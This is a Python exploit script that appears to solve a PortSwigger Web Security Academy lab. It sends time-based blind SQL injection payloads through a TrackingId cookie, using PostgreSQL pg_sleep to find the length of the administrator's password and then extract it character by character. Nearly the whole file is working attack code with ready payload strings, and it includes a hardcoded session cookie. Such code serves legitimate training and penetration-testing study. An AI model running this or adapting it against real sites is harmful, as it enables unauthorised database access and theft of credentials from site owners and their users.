#!/usr/bin/env python3

import requests
import time
import string
import sys

url = "https://0ad900b304fd47188e6258dc00dc003e.web-security-academy.net/"

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Referer': 'https://portswigger.net/',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i'
}

session_cookie = "scvimQsc6KWPpfT9CsKl7OSzFfYpSERT"

charset = string.ascii_lowercase + string.ascii_uppercase + \
    string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"


def test_character(position, char):
    """Test if a character at a specific position matches using time-based SQL injection"""

    payload = f"'||(SELECT CASE WHEN SUBSTRING(password,{position},1)='{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

    cookies = {
        'TrackingId': payload,
        'session': session_cookie
    }

    print(f"Testing position {position}, character '{char}'...", end=' ')

    try:
        start_time = time.time()
        response = requests.get(url, headers=headers,
                                cookies=cookies, timeout=10)
        end_time = time.time()

        response_time = end_time - start_time
        print(f"Response time: {response_time:.2f}s")

        if response_time >= 4:
            return True
        else:
            return False

    except requests.exceptions.Timeout:
        print("Timeout (likely correct character)")
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False


def extract_password():
    """Extract the password character by character"""
    password = ""
    position = 1
    max_length = 50

    print("Starting password extraction...")
    print("=" * 50)

    while position <= max_length:
        found_char = False

        for char in charset:
            if test_character(position, char):
                password += char
                print(
                    f"\n[+] Found character at position {position}: '{char}'")
                print(f"[+] Current password: '{password}'")
                print("-" * 30)
                found_char = True
                break

        if not found_char:
            print(f"\n[!] No character found at position {position}")
            print("[!] Password extraction complete or max length reached")
            break

        position += 1

        time.sleep(1)

    return password


def verify_password_length():
    """First, try to determine the password length"""
    print("Determining password length...")

    for length in range(1, 51):
        payload = f"'||(SELECT CASE WHEN LENGTH(password)={length} THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

        cookies = {
            'TrackingId': payload,
            'session': session_cookie
        }

        print(f"Testing length {length}...", end=' ')

        try:
            start_time = time.time()
            response = requests.get(
                url, headers=headers, cookies=cookies, timeout=10)
            end_time = time.time()

            response_time = end_time - start_time
            print(f"Response time: {response_time:.2f}s")

            if response_time >= 4:
                print(f"\n[+] Password length found: {length}")
                return length

        except requests.exceptions.Timeout:
            print("Timeout (likely correct length)")
            return length
        except Exception as e:
            print(f"Error: {e}")
            continue

        time.sleep(0.5)

    print("\n[!] Could not determine password length")
    return None


if __name__ == "__main__":
    print("PostgreSQL Time-Based SQL Injection - Password Extractor")
    print("=" * 60)

    length = verify_password_length()
    if length:
        print(f"Password length: {length}")
    print()

    extracted_password = extract_password()

    print("\n" + "=" * 60)
    print(f"FINAL RESULT: '{extracted_password}'")
    print("=" * 60)
